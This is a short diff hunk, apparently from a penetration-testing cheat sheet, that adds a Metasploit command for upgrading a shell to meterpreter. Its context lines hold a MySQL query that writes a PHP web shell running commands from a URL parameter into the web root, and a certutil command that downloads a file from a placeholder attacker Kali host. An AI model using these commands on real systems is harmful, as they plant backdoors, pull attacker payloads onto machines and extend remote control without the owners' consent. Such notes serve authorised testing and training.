@@ -953,3 +953,4 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 certutil -urlcache -split -f http://<your_kali_ip>/<file_name> <destination_path>
 
+use post/multi/manage/shell_to_meterpreter
